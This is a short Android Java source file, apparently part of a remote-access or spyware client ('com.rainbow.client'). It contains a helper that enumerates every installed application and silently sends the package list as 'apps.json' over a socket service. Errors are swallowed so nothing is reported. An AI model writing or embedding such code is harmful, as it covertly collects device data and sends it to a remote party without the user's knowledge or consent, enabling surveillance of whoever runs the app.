package com.rainbow.client;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import org.json.JSONArray;
import org.json.JSONObject;
import java.util.List;

public class AppsHelper {
    public static void dump(Context ctx) {
        try {
            PackageManager pm = ctx.getPackageManager();
            List<ApplicationInfo> apps = pm.getInstalledApplications(0);
            JSONArray arr = new JSONArray();
            for (ApplicationInfo a : apps) {
                JSONObject o = new JSONObject();
                o.put("package", a.packageName);
                o.put("name", pm.getApplicationLabel(a).toString());
                arr.put(o);
            }
            SocketService2.sendFile("apps.json", arr.toString().getBytes());
        } catch (Exception ignored) {}
    }
}